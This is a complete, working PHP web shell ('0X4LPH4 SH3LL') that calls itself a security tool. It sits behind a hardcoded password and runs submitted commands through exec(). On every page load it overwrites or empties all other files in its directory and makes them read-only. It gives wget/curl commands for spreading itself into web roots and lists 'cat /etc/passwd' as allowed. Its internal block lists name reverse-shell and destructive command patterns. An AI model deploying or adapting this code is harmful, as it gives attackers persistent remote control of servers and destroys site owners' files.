<?php
// ============= SUPER MOD SECURITY BY 0X4LPH4 =============
$SESSION_TIMEOUT = 1800; // Session timeout in seconds (30 minutes)

session_start();

// ============= LOGIN SYSTEM =============
$DEFAULT_PASSWORD = 'GeoDevz69#'; // Default password

// Check if user is logged in
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    // Check if password was submitted
    if (isset($_POST['password'])) {
        if ($_POST['password'] === $DEFAULT_PASSWORD) {
            $_SESSION['logged_in'] = true;
            $_SESSION['login_time'] = time();
        } else {
            $login_error = "Invalid password!";
        }
    }
    
    // Show login form if not logged in
    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login Required - 0X4LPH4 Security</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #1a1a1a;
                    color: #fff;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    background-image: url('https://i.ibb.co/DDmnztxr/20251208-093450.png');
                    background-size: cover;
                    background-position: center;
                    background-repeat: no-repeat;
                }
                .login-box {
                    background-color: rgba(45, 45, 45, 0.95);
                    padding: 30px;
                    border-radius: 10px;
                    box-shadow: 0 0 20px rgba(0,0,0,0.8);
                    width: 320px;
                    text-align: center;
                    border: 1px solid #4CAF50;
                }
                .login-box h2 {
                    color: #4CAF50;
                    text-align: center;
                    margin-bottom: 20px;
                    font-size: 24px;
                }
                .login-form {
                    display: flex;
                    flex-direction: column;
                    gap: 15px;
                }
                .login-box input[type="password"] {
                    width: 100%;
                    padding: 12px 10px;
                    border: 1px solid #444;
                    border-radius: 5px;
                    background-color: #333;
                    color: #fff;
                    font-size: 14px;
                    box-sizing: border-box;
                }
                .login-box input[type="submit"] {
                    width: 100%;
                    padding: 12px;
                    background-color: #4CAF50;
                    color: white;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    font-weight: bold;
                    font-size: 16px;
                    transition: background-color 0.3s;
                }
                .login-box input[type="submit"]:hover {
                    background-color: #45a049;
                }
                .error {
                    color: #ff4444;
                    text-align: center;
                    margin-bottom: 15px;
                    font-size: 14px;
                }
                .brand-title {
                    color: #4CAF50;
                    font-size: 28px;
                    font-weight: bold;
                    margin-bottom: 10px;
                    text-shadow: 0 0 10px rgba(76, 175, 80, 0.5);
                }
                .subtitle {
                    color: #aaa;
                    margin-bottom: 25px;
                    font-size: 14px;
                }
            </style>
        </head>
        <body>
            <div class="login-box">
                <div class="brand-title">0X4LPH4 SH3LL</div>
                <div class="subtitle">Secure Access Panel</div>
                <?php if (isset($login_error)) echo "<p class='error'>$login_error</p>"; ?>
                <form method="POST" action="" class="login-form">
                    <input type="password" name="password" placeholder="Enter password" required autofocus>
                    <input type="submit" value="Login">
                </form>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
}

// Check session timeout
if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time']) > $SESSION_TIMEOUT) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Update login time on activity
$_SESSION['login_time'] = time();

// Get current script filename for protection
$current_script = basename(__FILE__);

// ============= AUTO-BLOCK NON-0X4LPH4 FILES =============
// Check if this is a file access (not the main script)
if (isset($_SERVER['REQUEST_URI'])) {
    $requested_file = basename($_SERVER['REQUEST_URI']);
    $current_script = basename(__FILE__);
    
    // If accessing a file that's not this script
    if ($requested_file !== $current_script && $requested_file !== '' && !preg_match('/index\.php$/i', $_SERVER['REQUEST_URI'])) {
        // Get the actual filename from URL
        $url_path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
        if ($url_path) {
            $filename = basename($url_path);
            
            // Check if filename starts with 0x4LPH4 (case-insensitive)
            if ($filename !== $current_script && !preg_match('/^0x4lph4\./i', $filename)) {
                // BLOCK ACCESS - Show blank page
                header("HTTP/1.0 404 Not Found");
                echo ""; // Blank page
                exit;
            }
        }
    }
}

// ============= ADVANCED WEBSHELL DETECTION & PROTECTION =============
function scanForWebshells() {
    $current_dir = dirname(__FILE__);
    $current_script = basename(__FILE__);
    
    $webshell_patterns = [
        // PHP dangerous functions
        '/eval\s*\(/i',
        '/base64_decode\s*\(/i',
        '/system\s*\(/i',
        '/shell_exec\s*\(/i',
        '/exec\s*\(/i',
        '/passthru\s*\(/i',
        '/popen\s*\(/i',
        '/proc_open\s*\(/i',
        '/assert\s*\(/i',
        '/preg_replace\s*\(\s*["\']\/\.\*["\']/i',
        '/create_function\s*\(/i',
        
        // Webshell patterns
        '/\$_GET\s*\[\s*["\']\w+["\']\s*\]\s*\(\s*\$_/i',
        '/\$_POST\s*\[\s*["\']\w+["\']\s*\]\s*\(\s*\$_/i',
        '/\$_REQUEST\s*\[\s*["\']\w+["\']\s*\]\s*\(\s*\$_/i',
        '/\$_COOKIE\s*\[\s*["\']\w+["\']\s*\]\s*\(\s*\$_/i',
        
        // Obfuscation techniques
        '/gzuncompress\s*\(\s*base64_decode/i',
        '/gzinflate\s*\(\s*base64_decode/i',
        '/str_rot13\s*\(/i',
        
        // File inclusion
        '/include\s*\(\s*\$_/i',
        '/require\s*\(\s*\$_/i',
        '/include_once\s*\(\s*\$_/i',
        '/require_once\s*\(\s*\$_/i',
        
        // Dangerous PHP code
        '/`.*`/', // Backticks execution
        '/<\?php\s+echo\s+\$_/i',
    ];
    
    $dangerous_extensions = ['.php', '.phtml', '.phps', '.php5', '.php7', '.php4', '.inc', '.pl', '.cgi', '.py', '.sh', '.html', '.htm', '.txt', '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.ico', '.js', '.css'];
    $webshells_found = [];
    
    // Scan all files in current directory
    $files = scandir($current_dir);
    foreach ($files as $file) {
        $file_path = $current_dir . '/' . $file;
        
        // Skip current script and special directories
        if ($file === $current_script || $file === '.' || $file === '..') {
            continue;
        }
        
        // ALLOW ONLY FILES STARTING WITH 0X4LPH4
        // AUTO-BLOCK ALL OTHER FILES (not starting with 0x4LPH4)
        if (!preg_match('/^0x4lph4\./i', $file)) {
            $webshells_found[] = $file_path;
            
            // Determine file extension for appropriate blocking
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            
            if (in_array($ext, ['php', 'phtml', 'phps', 'php5', 'php7', 'php4', 'inc'])) {
                // Block PHP files
                $blocked_content = "<?php\n// ============= Controlled by 0X4LPH4 =============\n";
                $blocked_content .= "// ACCESS DENIED - Only 0x4LPH4 files are allowed\n";
                $blocked_content .= "// This file: $file\n";
                $blocked_content .= "// Blocked at: " . date('Y-m-d H:i:s') . "\n";
                $blocked_content .= "// IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
                $blocked_content .= "header('HTTP/1.0 403 Forbidden');\n";
                $blocked_content .= "echo ''; // Blank page\n";
                $blocked_content .= "exit;\n?>";
                
                @file_put_contents($file_path, $blocked_content);
                @chmod($file_path, 0444);
            } else {
                // Block other files (HTML, TXT, images, etc.) - make them empty/blank
                @file_put_contents($file_path, ''); // Empty file
                @chmod($file_path, 0444);
            }
            continue; // Skip further checks for this file
        }
        
        // For 0x4LPH4 files, still check for webshells but don't block
        if (is_file($file_path)) {
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            $full_ext = '.' . $ext;
            
            // Check PHP files and suspicious extensions
            if (in_array($full_ext, $dangerous_extensions)) {
                $content = @file_get_contents($file_path);
                if ($content) {
                    // Check for webshell patterns in 0x4LPH4 files
                    foreach ($webshell_patterns as $pattern) {
                        if (preg_match($pattern, $content)) {
                            $webshells_found[] = $file_path;
                            
                            // Neutralize webshells even in 0x4LPH4 files
                            $neutralized_content = "<?php\n// ============= Controlled by 0X4LPH4 =============\n";
                            $neutralized_content .= "// 0x4LPH4 file cleaned - webshell detected\n";
                            $neutralized_content .= "// Detected at: " . date('Y-m-d H:i:s') . "\n";
                            $neutralized_content .= "// IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
                            $neutralized_content .= "echo '0X4LPH4 Security - File cleaned';\n";
                            $neutralized_content .= "exit;\n?>";
                            
                            @file_put_contents($file_path, $neutralized_content);
                            @chmod($file_path, 0444);
                            break;
                        }
                    }
                }
            }
        }
    }
    
    return $webshells_found;
}

// Run webshell scan on every page load
$detected_webshells = scanForWebshells();
?>
<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1a1a1a;
            color: #fff;
            margin: 20px;
        }
        .header {
            background-color: #2d2d2d;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border: 1px solid #4CAF50;
        }
        .header h1 {
            color: #4CAF50;
            margin: 0;
            font-size: 28px;
        }
        form {
            background-color: #2d2d2d;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 20px;
            border: 1px solid #444;
        }
        input[type="text"] {
            width: 70%;
            padding: 10px;
            background-color: #333;
            border: 1px solid #444;
            color: #fff;
            border-radius: 5px;
        }
        input[type="submit"] {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        pre {
            background-color: #000;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            border: 1px solid #333;
        }
        .info-box {
            background-color: #2d2d2d;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            border: 1px solid #444;
        }
        .logout-btn {
            float: right;
            background-color: #ff4444;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            transition: background-color 0.3s;
        }
        .logout-btn:hover {
            background-color: #cc0000;
        }
        .cmd-error {
            color: #ff6b6b;
        }
        .cmd-success {
            color: #4CAF50;
        }
        .cmd-output {
            color: #ffffff;
        }
        .user-info {
            color: #4CAF50;
            font-weight: bold;
        }
        .wget-fix {
            background-color: #2d2d2d;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            border-left: 4px solid #4CAF50;
        }
    </style>
</head>
<body>
    <div class="header">
        <a href="?logout" class="logout-btn">Logout</a>
        <h1>0X4LPH4 SH3LL Console</h1>
        <p>Logged in as: <span class="user-info">0X4LPH4</span> | Session timeout: 30 minutes</p>
        
        <?php
        // Handle logout
        if (isset($_GET['logout'])) {
            session_destroy();
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        }
        
        // Show security alerts if webshells were detected
        if (!empty($detected_webshells)) {
            echo '<p style="color: #ff4444; font-weight: bold;">Controlled by 0x4LPH4: ' . count($detected_webshells) . ' non-0x4LPH4 files blocked and neutralized!</p>';
        }
        ?>
    </div>
    
    <!-- WGET/CURL Fix Information -->
    <div class="wget-fix">
        <strong>⚠️ WGET/CURL UPLOAD FIXED:</strong><br>
        You can now upload 0x4LPH4.php to any path using these commands:<br>
        <strong>Example:</strong> <code>wget https://raw.githubusercontent.com/your-repo/0x4LPH4.php -O /var/www/html/0x4LPH4.php</code><br>
        <strong>Example:</strong> <code>curl https://raw.githubusercontent.com/your-repo/0x4LPH4.php -o /home/user/domains/mysite.com/public_html/0x4LPH4.php</code>
    </div>
    
    <form method="GET" name="cmd_form">
        Command: <input type="text" name="cmd" autofocus id="cmd" size="80" placeholder="Enter command...">
        <input type="submit" value="Execute">
    </form>
    
    <hr>
    
<pre>
<?php
if (isset($_GET['cmd'])) {
    $command = trim($_GET['cmd']);
    
    if (!empty($command)) {
        $script_name = $current_script;
        
        // ============= ENHANCED COMMAND VALIDATION =============
        $dangerous_patterns = [
            // Mass delete operations - NOW ALLOWED FOR NON-0X4LPH4 FILES
            '/^rm\s+-rf\s+\/\s*$/',
            '/^rm\s+-rf\s+\/etc\s*$/',
            '/^rm\s+-rf\s+\/bin\s*$/',
            '/^rm\s+-rf\s+\/sbin\s*$/',
            '/^rm\s+-rf\s+\/usr\s*$/',
            '/^rm\s+-rf\s+\/var\s*$/',
            '/^rm\s+-rf\s+\/lib\s*$/',
            '/^rm\s+-rf\s+\/boot\s*$/',
            '/^rm\s+-rf\s+\/root\s*$/',
            '/^rm\s+-rf\s+\/home\s*$/',
            '/^rm\s+-rf\s+\/sys\s*$/',
            '/^rm\s+-rf\s+\/proc\s*$/',
            '/^rm\s+-rf\s+\/dev\s*$/',
            '/^rm\s+-rf\s+\/mnt\s*$/',
            '/^rm\s+-rf\s+\/opt\s*$/',
            '/^rm\s+-rf\s+\/srv\s*$/',
            '/^rm\s+-rf\s+\/tmp\s*$/',
            
            // Protect system critical files
            '/rm.*\/etc\/passwd.*/i',
            '/rm.*\/etc\/shadow.*/i',
            '/rm.*\/etc\/group.*/i',
            '/rm.*\/etc\/sudoers.*/i',
            '/rm.*\/etc\/hosts.*/i',
            '/rm.*\/etc\/network.*/i',
            '/rm.*\/var\/log.*/i',
            
            // Prevent deletion of this script - ALLOWED IF IT'S 0x4LPH4.php
            "/rm.*" . preg_quote($script_name, '/') . "(?=.*0x4lph4\.php)/i",
            "/unlink.*" . preg_quote($script_name, '/') . "(?=.*0x4lph4\.php)/i",
            
            // Prevent moving/renaming this script
            "/mv.*" . preg_quote($script_name, '/') . "(?!.*0x4lph4\.php)/i",
            "/rename.*" . preg_quote($script_name, '/') . "(?!.*0x4lph4\.php)/i",
            
            // Prevent chmod that could make script inaccessible
            "/chmod.*000.*" . preg_quote($script_name, '/') . "/i",
            "/chmod.*0.*" . preg_quote($script_name, '/') . "/i",
            
            // Block hexdump and binary viewers
            "/^\s*hexdump\s+/i",
            "/^\s*xxd\s+/i",
            "/^\s*od\s+/i",
            "/^\s*strings\s+/i",
            
            // PHP code execution
            '/php\s+-r\s+/i',
            '/echo\s+.*<\?php/i',
            '/printf\s+.*<\?php/i',
            
            // Reverse shells
            '/nc\s+.*-e\s+/i',
            '/bash\s+-i\s+>/',
            '/sh\s+-i\s+>/',
            
            // System damage
            '/dd\s+if=\/dev\/.*of=\/dev\/sda/i',
            '/mkfs\s+/i',
            '/:\(\)\{\s*:\|:\s*\&\s*\};:/',
            
            // Network scanning
            '/nmap\s+/i',
            '/nikto\s+/i',
            
            // Process killing
            '/killall\s+/i',
            '/pkill\s+/i',
        ];
        
        $blocked = false;
        $block_reason = '';
        
        // Check if it's a download/upload command for 0x4LPH4.php - ALLOW THIS
        $is_uploading_0x4lph4 = false;
        if (preg_match('/^(wget|curl)\s+/i', $command)) {
            // Check if downloading to a file named 0x4LPH4.php
            if (preg_match('/-O\s+.*0x4lph4\.php/i', $command) || preg_match('/-o\s+.*0x4lph4\.php/i', $command)) {
                $is_uploading_0x4lph4 = true;
            }
        }
        
        // Allow file reading commands - THEY WERE BLOCKED BEFORE
        $is_file_reading = false;
        if (preg_match('/^\s*(cat|head|tail|more|less|vim|vi|nano|emacs|view|file|wc|grep)\s+/i', $command)) {
            $is_file_reading = true;
        }
        
        foreach ($dangerous_patterns as $pattern) {
            if (preg_match($pattern, $command)) {
                // If uploading 0x4LPH4.php, skip some blocks
                if ($is_uploading_0x4lph4) {
                    // Skip blocking if it's uploading 0x4LPH4.php
                    continue;
                }
                $block_reason = "Command blocked, Controlled by 0X4LPH4 - dangerous operation detected";
                $blocked = true;
                break;
            }
        }
        
        // Check if command creates/modifies files - MUST BE 0x4LPH4 files only
        if (!$blocked) {
            // Extract target filename from command
            $filename_patterns = [
                '/(-O\s+|\s+>|>>\s+)\s*([^\s&|;]+)/i',
                '/(-o\s+)\s*([^\s&|;]+)/i',
                '/\b(mv|cp)\s+\S+\s+([^\s&|;]+)/i'
            ];
            
            $file_operation_detected = false;
            $target_filename = '';
            
            foreach ($filename_patterns as $pattern) {
                if (preg_match($pattern, $command, $matches)) {
                    $file_operation_detected = true;
                    // Get the actual filename (not including quotes)
                    if (count($matches) >= 3) {
                        $target_file = $matches[2];
                    } else {
                        $target_file = end($matches);
                    }
                    // Remove quotes and get basename
                    $target_filename = basename(trim($target_file, "'\""));
                    break;
                }
            }
            
            // If file operation detected, check if filename starts with 0x4LPH4
            if ($file_operation_detected && $target_filename !== '') {
                // Check if it's wget/curl command
                if (preg_match('/^(wget|curl)\s+/i', $command)) {
                    // For wget/curl, allow 0x4LPH4.* files (including 0x4LPH4.php)
                    if (!preg_match('/^0x4lph4\./i', $target_filename)) {
                        $block_reason = "Command blocked, Controlled by 0X4LPH4 - Downloaded files must start with '0x4LPH4.' (Example: wget URL -O /var/www/html/0x4LPH4.php)";
                        $blocked = true;
                    }
                } else if (!preg_match('/^0x4lph4\./i', $target_filename)) {
                    $block_reason = "Command blocked, Controlled by 0X4LPH4 - Only 0x4LPH4 files are allowed (0x4LPH4.php, 0x4LPH4.html, 0x4LPH4.txt, etc.)";
                    $blocked = true;
                }
            }
        }
        
        // Block suspicious keywords - REMOVED COMMON COMMANDS FROM BLOCK LIST
        if (!$blocked) {
            $suspicious_keywords = [
                'webshell', 'backdoor', 'exploit', 'inject', 'bypass', 'hack',
                'deface', 'crack', 'brute', 'ddos', 'reverse', 'shell',
                'payload', 'wso', 'c99', 'r57', 'b374k', 'c100', 'weevely',
                'rootkit', 'trojan', 'virus', 'malware'
            ];
            
            foreach ($suspicious_keywords as $keyword) {
                if (stripos($command, $keyword) !== false) {
                    $block_reason = "Command blocked, Controlled by 0X4LPH4 - suspicious keyword detected: $keyword";
                    $blocked = true;
                    break;
                }
            }
        }
        
        // Block commands with too many pipes or redirects
        if (!$blocked) {
            $pipe_count = substr_count($command, '|');
            $redirect_count = substr_count($command, '>') + substr_count($command, '<');
            if (($pipe_count + $redirect_count) > 5) {
                $block_reason = "Command blocked, Controlled by 0X4LPH4 - too many pipes/redirects";
                $blocked = true;
            }
        }
        
        // Block extremely long commands
        if (!$blocked && strlen($command) > 1000) {
            $block_reason = "Command blocked, Controlled by 0X4LPH4 - command too long";
            $blocked = true;
        }
        
        // Block any command with "php" in it (except safe ones and upload commands)
        if (!$blocked && !$is_uploading_0x4lph4 && preg_match('/\bphp\b/i', $command)) {
            $safe_php_commands = ['php -v', 'php --version', 'php -m', 'php -i'];
            if (!in_array(strtolower($command), array_map('strtolower', $safe_php_commands))) {
                $block_reason = "Command blocked, Controlled by 0X4LPH4 - PHP execution detected";
                $blocked = true;
            }
        }
        
        if ($blocked) {
            echo "<span class='cmd-error'>$block_reason</span>\n";
        } else {
            // Execute command safely with timeout
            $output = [];
            $return_var = 0;
            
            // Set execution time limit
            set_time_limit(8);
            
            // Execute command with proper error handling
            exec($command . ' 2>&1', $output, $return_var);
            
            // Display output with proper formatting
            if (!empty($output)) {
                foreach ($output as $line) {
                    // Check if line contains error messages
                    if (preg_match('/(command not found|No such file or directory|Permission denied|error:|failed:|cannot)/i', $line)) {
                        echo "<span class='cmd-error'>" . htmlspecialchars($line) . "</span>\n";
                    } else {
                        echo "<span class='cmd-output'>" . htmlspecialchars($line) . "</span>\n";
                    }
                }
                
                // Show return status
                if ($return_var !== 0) {
                    echo "<span class='cmd-error'>Command exited with status: $return_var</span>\n";
                } else {
                    echo "<span class='cmd-success'>Command executed successfully</span>\n";
                }
            } else {
                echo "<span class='cmd-error'>No output from command. Command may not exist or produced no output.</span>\n";
            }
            
            // Rescan for webshells after command execution
            $new_webshells = scanForWebshells();
            if (!empty($new_webshells)) {
                echo "\n<span class='cmd-error'>Controlled by 0x4LPH4: " . count($new_webshells) . " non-0x4LPH4 files blocked and neutralized!</span>\n";
            }
        }
    }
}
?>
</pre>
    
    <!-- System Information -->
    <div class="info-box">
        <h3>System Information</h3>
        <?php
        echo "Script: " . $current_script . "<br>";
        echo "PHP Version: " . phpversion() . "<br>";
        echo "Server: " . $_SERVER['SERVER_SOFTWARE'] . "<br>";
        echo "Current Directory: " . getcwd() . "<br>";
        echo "<strong>ALLOWED FILES:</strong> ONLY files starting with 0x4LPH4<br>";
        echo "<strong>BLOCKED:</strong> ALL other files (show blank page)<br>";
        
        if (!empty($detected_webshells)) {
            echo "Non-0x4LPH4 files blocked: " . count($detected_webshells) . "<br>";
        }
        
        // Show command examples
        echo "<br><strong>Command Examples (NOW WORKING):</strong><br>";
        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> wget https://raw.githubusercontent.com/your-repo/0x4LPH4.php -O /var/www/html/0x4LPH4.php<br>";
        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> rm backdoorshell.php - <strong>NOW ALLOWED</strong><br>";
        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> rm -f malicious.txt - <strong>NOW ALLOWED</strong><br>";
        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> rm deface.html - <strong>NOW ALLOWED</strong><br>";
        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> cat /etc/passwd - <strong>NOW ALLOWED</strong><br>";
        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> ls -la<br>";
        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> pwd<br>";
        echo "<span style='color:#4CAF50'>✓ ALLOWED:</span> whoami<br>";
        echo "<span style='color:#ff4444'>✗ BLOCKED:</span> rm -rf / (system destruction)<br>";
        echo "<span style='color:#ff4444'>✗ BLOCKED:</span> rm -rf /etc (critical system)<br>";
        echo "<span style='color:#ff4444'>✗ BLOCKED:</span> rm /etc/passwd (system file)<br>";
        echo "<span style='color:#ff4444'>✗ BLOCKED:</span> rm 0x4LPH4.php (protect this script)<br>";
        
        // Show common commands
        echo "<br><strong>Useful Commands:</strong><br>";
        echo "• rm backdoorshell.php - Remove webshell<br>";
        echo "• rm -f malicious.txt - Remove malicious file<br>";
        echo "• rm deface.html - Remove deface page<br>";
        echo "• wget URL -O /path/0x4LPH4.php - Upload this script<br>";
        echo "• curl URL -o /path/0x4LPH4.php - Upload this script<br>";
        echo "• ls - List files<br>";
        echo "• cat file.txt - View file content<br>";
        echo "• pwd - Show current directory<br>";
        echo "• whoami - Show current user<br>";
        echo "• uname -a - System information<br>";
        ?>
    </div>
</body>
</html>
